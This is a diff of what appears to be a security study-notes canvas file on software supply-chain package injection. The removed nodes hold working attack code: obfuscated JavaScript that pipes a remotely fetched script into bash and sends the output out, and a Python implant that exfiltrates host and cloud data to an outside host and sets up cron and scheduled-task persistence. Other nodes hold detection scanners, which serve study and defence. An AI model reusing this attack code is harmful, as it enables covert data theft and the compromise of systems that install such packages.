-      "id": "34bdd3aace7b9dc3",
-      "styleAttributes": {
-      },
-      "text": "**Technical Implementation:**\n\n```javascript\n// Sophisticated injection with multiple activation conditions\n(function() {\n  // Only activates under specific conditions to avoid detection\n  function shouldActivate() {\n    try {\n      // Check if in production environment\n      if (process.env.NODE_ENV !== 'production') return false;\n      \n      // Check if running in CI/CD environment (avoid detection during testing)\n      if (process.env.CI || process.env.TRAVIS || process.env.GITHUB_ACTIONS) return false;\n      \n      // Check if running in container (target deployment, not build)\n      if (require('fs').existsSync('/.dockerenv')) return true;\n      \n      // Check if running with high privileges\n      if (process.getuid && process.getuid() === 0) return true;\n      \n      // Target specific organizations through environment clues\n      const hostname = require('os').hostname();\n      const targetDomains = ['target-org', 'victim-company', 'enterprise'];\n      if (targetDomains.some(d => hostname.includes(d))) return true;\n      \n      // Time-based activation (only trigger after specific date)\n      const activationDate = new Date('2023-07-15');\n      if (Date.now() > activationDate.getTime()) return true;\n      \n      // Geolocation-based activation\n      // (simplified - real attack would check IP geolocation)\n      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;\n      if (timezone.includes('America/New_York')) return true;\n      \n      return false;\n    } catch(e) {\n      return false; // Fail closed to avoid errors revealing the attack\n    }\n  }\n\n  // Actual malicious payload\n  function executePayload() {\n    // [ Malicious code here ]\n  }\n\n  // Delayed execution to avoid detection during installation\n  setTimeout(() => {\n    if (shouldActivate()) {\n      executePayload();\n    }\n  }, 30 * 60 * 1000); // 30 minute delay\n})();\n```",
-      "type": "text",
-      "width": 1300,
-      "x": -5250,
-      "y": 180
-    },
-    {
-      "height": 60,
-      "id": "6d0a435dc31b31fa",
-      "styleAttributes": {
-        "textAlign": "center"
-      },
-      "text": "### 1. Conditional Execution Triggers",
-      "type": "text",
-      "width": 420,
-      "x": -3830,
-      "y": 1400
-    },
-    {
-      "height": 1180,
-      "id": "9280e600311e6343",
-      "styleAttributes": {
-      },
-      "text": "**Technical Implementation:**\n\n```javascript\n// Advanced code obfuscation techniques used in package injection\n// Example based on real-world attacks\n\n// String obfuscation using character codes\nfunction d(s) {\n  return s.split('').map(c => String.fromCharCode(c.charCodeAt(0) ^ 7)).join('');\n}\n\n// Encoded function names and strings\nconst a = d('jy}nbjk'); // \"request\"\nconst b = d('ottv|'); // \"https\"\nconst c = d('nblc'); // \"exec\"\nconst u = d('ottv|Gee') + d('lhooshwfou5`kj') + d('ieov\\\\}'); // \"https://malicious.com/api\"\n\n// Split code into innocuous-looking parts\nconst p1 = Buffer.from('cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLg==', 'base64').toString();\nconst p2 = Buffer.from('ZXhlYw==', 'base64').toString();\nconst p3 = Buffer.from('Y3VybCAtcyA=', 'base64').toString();\n\n// Dynamically assemble and execute payload\nconst m = Function('return ' + p1 + p2)();\nconst r = Function('return require(\"' + b + '\")')();\n\n// Hide network traffic in legitimate-looking analytics\nfunction sendAnalytics(data) {\n  const h = {'User-Agent': 'npm/6.14.4', 'Content-Type': 'application/json'};\n  const o = {hostname: u.split('/')[2], path: '/api/v1/metrics', method: 'POST', headers: h};\n  const q = r.request(o);\n  q.write(JSON.stringify({data: data}));\n  q.end();\n}\n\n// Execute with delayed trigger\nsetTimeout(() => {\n  // Only run with specific environment variable set\n  // (which can be set by earlier stage of the attack)\n  if (process.env.NODE_METRICS_ENABLED === 'true') {\n    try {\n      // Execute shell command and send results\n      m(p3 + u + '/init.sh | bash', (e, o) => {\n        if (!e) sendAnalytics(Buffer.from(o).toString('base64'));\n      });\n    } catch(e) {}\n  }\n}, 3600 * 1000); // One hour delay\n```",
-      "type": "text",
-      "width": 1140,
-      "x": -5110,
-      "y": 1460
-    },
-    {
-      "height": 6220,
-      "id": "4ffeca3661717c59",
-      "styleAttributes": {
-      },
-      "text": "### 1. Static Code Analysis\n\n**Technical Implementation:**\n\n```python\n# Example static analysis rules for Python package injection detection\nimport ast\nimport sys\nimport os\nimport re\n\n# Scan for suspicious patterns in Python code\ndef scan_file(file_path):\n    \"\"\"Scan a Python file for suspicious patterns indicative of package injection\"\"\"\n    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:\n        content = f.read()\n    \n    # Check for common obfuscation techniques\n    obfuscation_indicators = [\n        # Base64 encoded strings\n        r'base64\\.b(?:64)?decode\\((?:b)?[\\'\"][A-Za-z0-9+/=]+[\\'\"]',\n        # String manipulation to hide commands\n        r'(?:chr|ord)\\(\\d+\\)(?:\\s*\\+\\s*(?:chr|ord)\\(\\d+\\))+',\n        # Exec/eval with dynamic content\n        r'(?:exec|eval)\\((?![\"\\']\\s*(?:pass|return|print|#))',\n        # Suspicious imports on one line\n        r'import\\s+(?:subprocess|socket|urllib|requests).*(?:os|sys|shutil)',\n        # Hidden imports\n        r'__import__\\([\"\\'](?:subprocess|socket|urllib|requests|os|sys)',\n        # Function that uses __globals__ or __builtins__\n        r'(?:__globals__|__builtins__)\\[(?:b)?[\"\\'](?:eval|exec|compile)',\n    ]\n    \n    findings = []\n    \n    # Check for string patterns\n    for pattern in obfuscation_indicators:\n        matches = re.finditer(pattern, content)\n        for match in matches:\n            findings.append({\n                'type': 'obfuscation',\n                'pattern': pattern,\n                'line': content[:match.start()].count('\\n') + 1,\n                'match': match.group(0)\n            })\n    \n    # Parse AST for deeper analysis\n    try:\n        tree = ast.parse(content)\n        visitor = SuspiciousNodeVisitor()\n        visitor.visit(tree)\n        findings.extend(visitor.findings)\n    except SyntaxError:\n        findings.append({\n            'type': 'syntax_error',\n            'pattern': 'Invalid Python syntax',\n            'line': 0,\n            'match': 'File contains invalid Python syntax - may indicate obfuscation'\n        })\n    \n    return findings\n\nclass SuspiciousNodeVisitor(ast.NodeVisitor):\n    \"\"\"AST visitor to find suspicious code patterns\"\"\"\n    \n    def __init__(self):\n        self.findings = []\n        self.in_except_block = False\n        self.line_no = 0\n    \n    def visit(self, node):\n        \"\"\"Track line numbers for better reporting\"\"\"\n        if hasattr(node, 'lineno'):\n            self.line_no = node.lineno\n        super().visit(node)\n    \n    def visit_Try(self, node):\n        \"\"\"Track when we're in exception handling blocks (often used to hide errors)\"\"\"\n        old_except = self.in_except_block\n        self.in_except_block = True\n        for handler in node.handlers:\n            # Empty except blocks are suspicious\n            if not handler.body:\n                self.findings.append({\n                    'type': 'empty_except',\n                    'pattern': 'Empty except block',\n                    'line': handler.lineno,\n                    'match': 'except: pass'\n                })\n            # Broad exception handling\n            if handler.type is None or (\n                hasattr(handler.type, 'id') and handler.type.id == 'Exception'\n            ):\n                self.findings.append({\n                    'type': 'broad_except',\n                    'pattern': 'Overly broad exception handling',\n                    'line': handler.lineno,\n                    'match': 'except [Exception]:'\n                })\n        \n        self.generic_visit(node)\n        self.in_except_block = old_except\n    \n    def visit_Import(self, node):\n        \"\"\"Check for suspicious imports\"\"\"\n        suspicious_modules = {\n            'subprocess': 'Command execution',\n            'socket': 'Network communication',\n            'urllib.request': 'Network communication',\n            'requests': 'Network communication',\n            'tempfile': 'Potential temp file creation',\n            'base64': 'Potential data obfuscation'\n        }\n        \n        for alias in node.names:\n            mod_name = alias.name\n            if mod_name in suspicious_modules:\n                self.findings.append({\n                    'type': 'suspicious_import',\n                    'pattern': suspicious_modules[mod_name],\n                    'line': node.lineno,\n                    'match': f'import {mod_name}'\n                })\n        \n        self.generic_visit(node)\n    \n    def visit_Call(self, node):\n        \"\"\"Check for suspicious function calls\"\"\"\n        # Check for exec/eval calls\n        if isinstance(node.func, ast.Name) and node.func.id in ('exec', 'eval', 'compile'):\n            self.findings.append({\n                'type': 'dangerous_call',\n                'pattern': 'Code execution',\n                'line': node.lineno,\n                'match': f'{node.func.id}(...)'\n            })\n        \n        # Check for os.system/subprocess calls\n        if isinstance(node.func, ast.Attribute):\n            if isinstance(node.func.value, ast.Name):\n                if node.func.value.id == 'os' and node.func.attr == 'system':\n                    self.findings.append({\n                        'type': 'command_execution',\n                        'pattern': 'Shell command execution',\n                        'line': node.lineno,\n                        'match': 'os.system(...)'\n                    })\n                elif node.func.value.id == 'subprocess' and node.func.attr in ('call', 'Popen', 'run'):\n                    self.findings.append({\n                        'type': 'command_execution',\n                        'pattern': 'Process execution',\n                        'line': node.lineno,\n                        'match': f'subprocess.{node.func.attr}(...)'\n                    })\n        \n        self.generic_visit(node)\n    \n    def visit_Compare(self, node):\n        \"\"\"Check for environment fingerprinting\"\"\"\n        # Look for environment checks that might indicate targeting\n        if isinstance(node.left, ast.Attribute):\n            # Check for os.environ access\n            if (isinstance(node.left.value, ast.Name) and node.left.value.id == 'os' and \n                node.left.attr == 'environ'):\n                self.findings.append({\n                    'type': 'environment_check',\n                    'pattern': 'Environment variable check',\n                    'line': node.lineno,\n                    'match': 'os.environ check'\n                })\n            \n            # Check for platform.system() checks\n            if (isinstance(node.left.value, ast.Name) and node.left.value.id == 'platform' and \n                node.left.attr in ('system', 'platform', 'release')):\n                self.findings.append({\n                    'type': 'platform_check', \n                    'pattern': 'Platform targeting',\n                    'line': node.lineno,\n                    'match': f'platform.{node.left.attr} check'\n                })\n        \n        self.generic_visit(node)\n\n# Scan an entire package\ndef scan_package(package_dir):\n    \"\"\"Scan all Python files in a package for suspicious patterns\"\"\"\n    all_findings = {}\n    \n    for root, dirs, files in os.walk(package_dir):\n        for file in files:\n            if file.endswith('.py'):\n                file_path = os.path.join(root, file)\n                findings = scan_file(file_path)\n                if findings:\n                    rel_path = os.path.relpath(file_path, package_dir)\n                    all_findings[rel_path] = findings\n    \n    return all_findings\n\n# Main function\ndef main():\n    if len(sys.argv) != 2:\n        print(f\"Usage: {sys.argv[0]} <package_directory>\")\n        sys.exit(1)\n    \n    package_dir = sys.argv[1]\n    if not os.path.isdir(package_dir):\n        print(f\"Error: {package_dir} is not a directory\")\n        sys.exit(1)\n    \n    findings = scan_package(package_dir)\n    \n    # Calculate risk score\n    risk_weights = {\n        'obfuscation': 8,\n        'syntax_error': 5,\n        'empty_except': 3,\n        'broad_except': 2,\n        'suspicious_import': 3,\n        'dangerous_call': 9,\n        'command_execution': 9,\n        'environment_check': 4,\n        'platform_check': 4\n    }\n    \n    total_score = 0\n    total_findings = 0\n    \n    print(\"\\n=== Package Injection Analysis Results ===\\n\")\n    \n    for file_path, file_findings in findings.items():\n        file_score = sum(risk_weights.get(f['type'], 1) for f in file_findings)\n        total_score += file_score\n        total_findings += len(file_findings)\n        \n        print(f\"\\nFile: {file_path}\")\n        print(f\"Risk Score: {file_score}\")\n        print(\"-\" * 40)\n        \n        for finding in file_findings:\n            print(f\"Line {finding['line']}: {finding['type']} - {finding['pattern']}\")\n            print(f\"  {finding['match']}\")\n        \n    print(\"\\n=== Summary ===\")\n    print(f\"Total files with issues: {len(findings)}\")\n    print(f\"Total suspicious patterns: {total_findings}\")\n    print(f\"Overall risk score: {total_score}\")\n    \n    if total_score > 20:\n        print(\"\\n⚠️  HIGH RISK - Multiple severe indicators of package injection detected\")\n        return 2\n    elif total_score > 10:\n        print(\"\\n⚠️  MEDIUM RISK - Some potential indicators of package injection\")\n        return 1\n    else:\n        print(\"\\n✅  LOW RISK - Limited suspicious patterns detected\")\n        return 0\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n```",
-      "type": "text",
-      "width": 1660,
-      "x": -1420,
-      "y": 2360
-    },
-    {
-      "file": "CyberSecurity/Security+/1-Threats-Attacks-Vulnerabilities/Attacking-Frameworks/MITRE ATT&CK/Enterprise-Attack/techniques/Image File Execution Options Injection.md",
-      "height": 400,
-      "id": "aab3ec9d50da8731",
-      "styleAttributes": {
-      },
+      "file": "CyberSecurity/Security+/1-Threats-Attacks-Vulnerabilities/Supply Chain Attacks/Cross-env Typosquatting Campaign (2020).md",
+      "height": 960,
+      "id": "e78a548a9251db08",
       "type": "file",
-      "width": 400,
-      "x": -400,
-      "y": 1560
-    },
-    {
-      "height": 60,
-      "id": "e0d4e35a3f0e81b9",
-      "styleAttributes": {
-        "textAlign": "center"
-      },
-      "text": "### Detection Methods for Package Injection",
-      "type": "text",
-      "width": 480,
-      "x": -1480,
-      "y": 2080
-    },
-    {
-      "height": 4100,
-      "id": "94e0bc03b2bf4e64",
-      "styleAttributes": {
-      },
-      "text": "**Technical Implementation:**\n\n```python\n# Python package injection using living-off-the-land techniques\n# These techniques use legitimate system tools to avoid detection\n\nimport os\nimport sys\nimport platform\nimport subprocess\nfrom datetime import datetime\nimport json\nimport base64\nimport urllib.request\nimport tempfile\nimport atexit\nimport random\nimport time\n\nclass SystemProfiler:\n    \"\"\"Legitimate-looking system profiling utility\"\"\"\n    \n    def __init__(self):\n        self.system_info = self._collect_system_info()\n        \n    def _collect_system_info(self):\n        \"\"\"Collect system information for 'compatibility checks'\"\"\"\n        info = {\n            \"platform\": platform.system(),\n            \"release\": platform.release(),\n            \"version\": platform.version(),\n            \"architecture\": platform.machine(),\n            \"processor\": platform.processor(),\n            \"python_version\": sys.version,\n            \"timestamp\": datetime.now().isoformat()\n        }\n        \n        # This appears to be compatibility checking\n        # but actually identifies valuable targets\n        if os.name == 'posix':\n            # Check for cloud environments\n            info[\"aws\"] = self._check_cloud_env(\"aws\")\n            info[\"azure\"] = self._check_cloud_env(\"azure\")\n            info[\"gcp\"] = self._check_cloud_env(\"gcp\")\n            \n            # Look for container environments\n            info[\"docker\"] = os.path.exists(\"/.dockerenv\")\n            info[\"kubernetes\"] = \"KUBERNETES_SERVICE_HOST\" in os.environ\n            \n            # Check for valuable files\n            info[\"has_ssh_keys\"] = os.path.exists(os.path.expanduser(\"~/.ssh/id_rsa\"))\n        \n        return info\n    \n    def _check_cloud_env(self, provider):\n        \"\"\"Check if running in specific cloud environment\"\"\"\n        indicators = {\n            \"aws\": [\"/sys/hypervisor/uuid\", \"EC2_\", \"AWS_\"],\n            \"azure\": [\"WALinuxAgent\", \"AZURE_\"],\n            \"gcp\": [\"Compute Engine\", \"GOOGLE_CLOUD_\"]\n        }\n        \n        # Check for files indicating cloud provider\n        for path in [\"/sys/class/dmi/id/product_name\", \"/sys/class/dmi/id/sys_vendor\"]:\n            if os.path.exists(path):\n                try:\n                    with open(path, 'r') as f:\n                        content = f.read().lower()\n                        if provider in content:\n                            return True\n                except:\n                    pass\n        \n        # Check for environment variables\n        for env_prefix in indicators[provider]:\n            for env_var in os.environ:\n                if env_var.startswith(env_prefix):\n                    return True\n        \n        return False\n    \n    def report(self):\n        \"\"\"Generate compatibility report - a legitimate-looking function\"\"\"\n        print(f\"System: {self.system_info['platform']} {self.system_info['release']}\")\n        print(f\"Architecture: {self.system_info['architecture']}\")\n        print(f\"Python version: {sys.version.split()[0]}\")\n        \n        # Appears to be checking legitimate compatibility issues\n        if self.system_info['platform'] == 'Windows':\n            if int(platform.version().split('.')[0]) < 10:\n                print(\"Warning: Some features may not work on Windows versions below 10\")\n                \n        return self.system_info\n\n\n# The malicious part is hidden in a background optimization function\ndef _optimize_resource_usage():\n    \"\"\"Appears to be an innocent optimization function\"\"\"\n    # But actually contains the malicious payload\n    try:\n        profiler = SystemProfiler()\n        system_data = profiler.report()\n        \n        # Only proceed if high-value target identified\n        is_valuable_target = (\n            system_data.get(\"aws\", False) or \n            system_data.get(\"azure\", False) or\n            system_data.get(\"gcp\", False) or\n            system_data.get(\"kubernetes\", False) or\n            system_data.get(\"has_ssh_keys\", False)\n        )\n        \n        if is_valuable_target:\n            # Use living-off-the-land techniques for malicious purposes\n            \n            # 1. Create a hidden file using legitimate tempfile module\n            temp_dir = tempfile.gettempdir()\n            profile_file = os.path.join(temp_dir, f\".{random.randrange(100000,999999)}.json\")\n            \n            # 2. Encode system data to look like cache file\n            with open(profile_file, 'w') as f:\n                json.dump(system_data, f)\n            \n            # 3. Use built-in libraries to exfiltrate data\n            encoded_data = base64.b64encode(json.dumps(system_data).encode()).decode()\n            urllib.request.urlopen(\n                f\"https://api.package-stats.io/v1/metrics?d={encoded_data}\"\n            )\n            \n            # 4. Schedule cleanup to remove evidence\n            atexit.register(lambda: os.path.exists(profile_file) and os.remove(profile_file))\n            \n            # 5. Use platform-specific LOL techniques to establish persistence\n            if system_data[\"platform\"] == \"Linux\":\n                # Find a world-writable cron directory\n                cron_dirs = [\"/etc/cron.d\", \"/etc/cron.hourly\", \"/var/spool/cron/crontabs\"]\n                for cdir in cron_dirs:\n                    if os.path.exists(cdir) and os.access(cdir, os.W_OK):\n                        cron_file = os.path.join(cdir, \".system-update\")\n                        try:\n                            with open(cron_file, 'w') as f:\n                                f.write(f\"* * * * * {sys.executable} -c 'import urllib.request as r; import os; os.system(r.urlopen(\\\"https://api.package-stats.io/updates/unix.py\\\").read().decode())'\")\n                            # Make file executable but hidden\n                            os.chmod(cron_file, 0o755)\n                            break\n                        except:\n                            pass\n                            \n            elif system_data[\"platform\"] == \"Windows\":\n                # Use Windows Task Scheduler\n                try:\n                    # Create a .bat file to execute the payload\n                    bat_path = os.path.join(os.environ[\"TEMP\"], \"winupdate.bat\")\n                    with open(bat_path, 'w') as f:\n                        f.write(f\"@echo off\\n{sys.executable} -c \\\"import urllib.request as r; exec(r.urlopen('https://api.package-stats.io/updates/win.py').read().decode())\\\"\")\n                    \n                    # Use schtasks to create a scheduled task\n                    subprocess.Popen(\n                        f\"schtasks /create /tn \\\"WindowsUpdater\\\" /tr \\\"{bat_path}\\\" /sc hourly /ru SYSTEM /f\",\n                        shell=True, \n                        stdout=subprocess.PIPE,\n                        stderr=subprocess.PIPE\n                    )\n                except:\n                    pass\n    except:\n        # Silently fail to avoid detection\n        pass\n\n# Delayed execution to avoid immediate detection\ntime.sleep(random.randrange(300, 900))  # 5-15 minute delay\n_optimize_resource_usage()\n```",
-      "type": "text",
-      "width": 2120,
-      "x": -5680,
-      "y": 3110
-    },
-    {
-      "height": 10920,
-      "id": "2ac1f04fa50e2c45",
-      "styleAttributes": {
-      },
-      "text": "### 1. Behavioral Analysis (Runtime Monitoring) \n\n**Technical Implementation:**\n\n``` javascript\n\n// Runtime behavioral monitoring system for Node.js packages\n// To be used in test environments to detect suspicious behaviors\n\nconst fs = require('fs');\nconst path = require('path');\nconst childProcess = require('child_process');\nconst net = require('net');\nconst http = require('http');\nconst https = require('https');\nconst os = require('os');\nconst crypto = require('crypto');\n\n// Store original functions to restore later\nconst originalFunctions = {\n  fs: {\n    readFile: fs.readFile,\n    writeFile: fs.writeFile,\n    readFileSync: fs.readFileSync,\n    writeFileSync: fs.writeFileSync,\n    unlink: fs.unlink,\n    unlinkSync: fs.unlinkSync\n  },\n  childProcess: {\n    exec: childProcess.exec,\n    execSync: childProcess.execSync,\n    spawn: childProcess.spawn,\n    spawnSync: childProcess.spawnSync\n  },\n  http: {\n    request: http.request,\n    get: http.get\n  },\n  https: {\n    request: https.request,\n    get: https.get\n  },\n  net: {\n    connect: net.connect,\n    createConnection: net.createConnection\n  }\n};\n\n// Configuration\nconst config = {\n  logDirectory: process.env.BEHAVIOR_LOG_DIR || './logs',\n  enableFileLogging: true,\n  enableConsoleLogging: true,\n  monitorEnvAccess: true,\n  enableAlerts: true,\n  alertThreshold: 5, // Number of suspicious activities before alerting\n  whitelistedDomains: [\n    'registry.npmjs.org',\n    'nodejs.org',\n    'github.com',\n    'githubusercontent.com'\n  ],\n  whitelistedIPs: [\n    '127.0.0.1',\n    '::1'\n  ]\n};\n\n// Initialize\nconst activities = [];\nlet suspiciousCount = 0;\n\n// Create log directory if it doesn't exist\nif (config.enableFileLogging) {\n  try {\n    if (!fs.existsSync(config.logDirectory)) {\n      fs.mkdirSync(config.logDirectory, { recursive: true });\n    }\n  } catch (err) {\n    console.error(`Failed to create log directory: ${err.message}`);\n  }\n}\n\n// Logger utility\nconst logger = {\n  log(activity) {\n    activities.push(activity);\n    \n    const timestamp = new Date().toISOString();\n    const logEntry = `[${timestamp}] ${JSON.stringify(activity)}`;\n    \n    if (config.enableConsoleLogging) {\n      console.log(`[BEHAVIOR-MONITOR] ${logEntry}`);\n    }\n    \n    if (config.enableFileLogging) {\n      const logFile = path.join(config.logDirectory, `behavior-${new Date().toISOString().split('T')[0]}.log`);\n      fs.appendFileSync(logFile, logEntry + '\\n');\n    }\n    \n    // Check if activity is suspicious\n    if (activity.suspicious) {\n      suspiciousCount++;\n      if (config.enableAlerts && suspiciousCount >= config.alertThreshold) {\n        this.sendAlert(activity);\n      }\n    }\n  },\n  \n  sendAlert(activity) {\n    console.error(`[ALERT] Suspicious activity threshold reached! Latest: ${JSON.stringify(activity)}`);\n    // In a real implementation, this could send an email, webhook, etc.\n  }\n};\n\n// Helper functions\nfunction isWhitelistedDomain(domain) {\n  return config.whitelistedDomains.some(whitelist => domain.includes(whitelist));\n}\n\nfunction isWhitelistedIP(ip) {\n  return config.whitelistedIPs.includes(ip);\n}\n\nfunction isPathSuspicious(filePath) {\n  const sensitivePatterns = [\n    /\\.env$/i,\n    /config.*\\.json$/i,\n    /password/i,\n    /credential/i,\n    /\\.ssh\\//i,\n    /\\.aws\\//i,\n    /\\.npmrc$/i,\n    /\\.yarnrc$/i\n  ];\n  \n  return sensitivePatterns.some(pattern => pattern.test(filePath));\n}\n\nfunction isCommandSuspicious(command) {\n  const suspiciousPatterns = [\n    /curl\\s+/i,\n    /wget\\s+/i,\n    /ping\\s+/i,\n    /nc\\s+/i,\n    /nmap/i,\n    /chmod\\s+/i,\n    /rm\\s+-rf/i,\n    /eval\\(/i,\n    /base64/i\n  ];\n  \n  return suspiciousPatterns.some(pattern => pattern.test(command));\n}\n\n// Monkey patch file system operations\nfs.readFile = function(filePath, options, callback) {\n  // Handle optional options\n  if (typeof options === 'function') {\n    callback = options;\n    options = undefined;\n  }\n  \n  const suspicious = isPathSuspicious(filePath.toString());\n  \n  logger.log({\n    type: 'fs',\n    operation: 'readFile',\n    path: filePath.toString(),\n    suspicious\n  });\n  \n  return originalFunctions.fs.readFile(filePath, options, callback);\n};\n\nfs.readFileSync = function(filePath, options) {\n  const suspicious = isPathSuspicious(filePath.toString());\n  \n  logger.log({\n    type: 'fs',\n    operation: 'readFileSync',\n    path: filePath.toString(),\n    suspicious\n  });\n  \n  return originalFunctions.fs.readFileSync(filePath, options);\n};\n\nfs.writeFile = function(filePath, data, options, callback) {\n  // Handle optional options\n  if (typeof options === 'function') {\n    callback = options;\n    options = undefined;\n  }\n  \n  const suspicious = isPathSuspicious(filePath.toString());\n  \n  logger.log({\n    type: 'fs',\n    operation: 'writeFile',\n    path: filePath.toString(),\n    dataSize: Buffer.isBuffer(data) ? data.length : String(data).length,\n    suspicious\n  });\n  \n  return originalFunctions.fs.writeFile(filePath, data, options, callback);\n};\n\nfs.writeFileSync = function(filePath, data, options) {\n  const suspicious = isPathSuspicious(filePath.toString());\n  \n  logger.log({\n    type: 'fs',\n    operation: 'writeFileSync',\n    path: filePath.toString(),\n    dataSize: Buffer.isBuffer(data) ? data.length : String(data).length,\n    suspicious\n  });\n  \n  return originalFunctions.fs.writeFileSync(filePath, data, options);\n};\n\n// Monkey patch child process operations\nchildProcess.exec = function(command, options, callback) {\n  // Handle optional options\n  if (typeof options === 'function') {\n    callback = options;\n    options = undefined;\n  }\n  \n  const suspicious = isCommandSuspicious(command);\n  \n  logger.log({\n    type: 'childProcess',\n    operation: 'exec',\n    command,\n    suspicious\n  });\n  \n  return originalFunctions.childProcess.exec(command, options, callback);\n};\n\nchildProcess.execSync = function(command, options) {\n  const suspicious = isCommandSuspicious(command);\n  \n  logger.log({\n    type: 'childProcess',\n    operation: 'execSync',\n    command,\n    suspicious\n  });\n  \n  return originalFunctions.childProcess.execSync(command, options);\n};\n\nchildProcess.spawn = function(command, args, options) {\n  const suspicious = isCommandSuspicious(command + ' ' + (args ? args.join(' ') : ''));\n  \n  logger.log({\n    type: 'childProcess',\n    operation: 'spawn',\n    command,\n    args,\n    suspicious\n  });\n  \n  return originalFunctions.childProcess.spawn(command, args, options);\n};\n\n// Monkey patch network operations\nfunction monitorHttpRequest(module, methodName) {\n  return function(url, options, callback) {\n    // Handle different argument patterns\n    if (typeof url === 'string') {\n      url = new URL(url);\n    } else if (typeof url === 'object' && !(url instanceof URL)) {\n      callback = options;\n      options = url;\n      url = options.url || options.host;\n    }\n    \n    const hostname = (url instanceof URL) ? url.hostname : \n                   (typeof url === 'string') ? new URL(url).hostname : \n                   options.hostname || options.host;\n                   \n    const suspicious = !isWhitelistedDomain(hostname);\n    \n    logger.log({\n      type: 'http',\n      operation: methodName,\n      url: hostname,\n      suspicious\n    });\n    \n    return originalFunctions[module][methodName].apply(this, arguments);\n  };\n}\n\nhttp.request = monitorHttpRequest('http', 'request');\nhttp.get = monitorHttpRequest('http', 'get');\nhttps.request = monitorHttpRequest('https', 'request');\nhttps.get = monitorHttpRequest('https', 'get');\n\n// Monitor TCP connections\nnet.connect = net.createConnection = function() {\n  const args = Array.from(arguments);\n  let options = args[0];\n  let host = null;\n  \n  if (typeof options === 'object') {\n    host = options.host || options.hostname || '127.0.0.1';\n  } else if (typeof args[1] === 'string') {\n    host = args[1];\n  }\n  \n  const suspicious = host && !isWhitelistedIP(host);\n  \n  logger.log({\n    type: 'net',\n    operation: 'connect',\n    host,\n    port: typeof options === 'object' ? options.port : args[0],\n    suspicious\n  });\n  \n  return originalFunctions.net.connect.apply(this, args);\n};\n\n// Monitor environment variables if enabled\nif (config.monitorEnvAccess) {\n  const originalProcessEnv = process.env;\n  const envProxy = new Proxy(originalProcessEnv, {\n    get(target, prop) {\n      const value = target[prop];\n      \n      const sensitive = /token|key|secret|password|credential/i.test(prop);\n      \n      logger.log({\n        type: 'env',\n        operation: 'access',\n        variable: prop,\n        suspicious: sensitive\n      });\n      \n      return value;\n    },\n    set(target, prop, value) {\n      const sensitive = /token|key|secret|password|credential/i.test(prop);\n      \n      logger.log({\n        type: 'env',\n        operation: 'modify',\n        variable: prop,\n        suspicious: sensitive\n      });\n      \n      target[prop] = value;\n      return true;\n    }\n  });\n  \n  process.env = envProxy;\n}\n\n// API for the monitor\nconst monitor = {\n  start() {\n    console.log('[BEHAVIOR-MONITOR] Runtime monitoring started');\n    return this;\n  },\n  \n  stop() {\n    // Restore original functions\n    Object.keys(originalFunctions).forEach(module => {\n      Object.keys(originalFunctions[module]).forEach(func => {\n        if (module === 'fs') {\n          fs[func] = originalFunctions[module][func];\n        } else if (module === 'childProcess') {\n          childProcess[func] = originalFunctions[module][func];\n        } else if (module === 'http') {\n          http[func] = originalFunctions[module][func];\n        } else if (module === 'https') {\n          https[func] = originalFunctions[module][func];\n        } else if (module === 'net') {\n          net[func] = originalFunctions[module][func];\n        }\n      });\n    });\n    \n    // Restore process.env if it was proxied\n    if (config.monitorEnvAccess) {\n      process.env = originalProcessEnv;\n    }\n    \n    console.log('[BEHAVIOR-MONITOR] Runtime monitoring stopped');\n    return this;\n  },\n  \n  getActivities() {\n    return activities;\n  },\n  \n  getSuspiciousActivities() {\n    return activities.filter(activity => activity.suspicious);\n  },\n  \n  getSuspiciousCount() {\n    return suspiciousCount;\n  },\n  \n  setConfig(newConfig) {\n    Object.assign(config, newConfig);\n    return this;\n  },\n  \n  clearActivities() {\n    activities.length = 0;\n    suspiciousCount = 0;\n    return this;\n  },\n  \n  generateReport() {\n    const report = {\n      timestamp: new Date().toISOString(),\n      totalActivities: activities.length,\n      suspiciousActivities: suspiciousCount,\n      summary: {\n        fs: activities.filter(a => a.type === 'fs').length,\n        childProcess: activities.filter(a => a.type === 'childProcess').length,\n        http: activities.filter(a => a.type === 'http').length,\n        net: activities.filter(a => a.type === 'net').length,\n        env: activities.filter(a => a.type === 'env').length\n      },\n      suspiciousByType: {\n        fs: activities.filter(a => a.type === 'fs' && a.suspicious).length,\n        childProcess: activities.filter(a => a.type === 'childProcess' && a.suspicious).length,\n        http: activities.filter(a => a.type === 'http' && a.suspicious).length,\n        net: activities.filter(a => a.type === 'net' && a.suspicious).length,\n        env: activities.filter(a => a.type === 'env' && a.suspicious).length\n      },\n      recentSuspicious: activities.filter(a => a.suspicious).slice(-10)\n    };\n    \n    if (config.enableFileLogging) {\n      const reportFile = path.join(config.logDirectory, `report-${new Date().toISOString().replace(/:/g, '-')}.json`);\n      fs.writeFileSync(reportFile, JSON.stringify(report, null, 2));\n      console.log(`[BEHAVIOR-MONITOR] Report generated at ${reportFile}`);\n    }\n    \n    return report;\n  }\n};\n\nmodule.exports = monitor;\n\n```",
-      "type": "text",
-      "width": 1400,
-      "x": -2880,
-      "y": 2360
+      "width": 1050,
+      "x": -1760,
+      "y": -4230
     }
   ]
 }
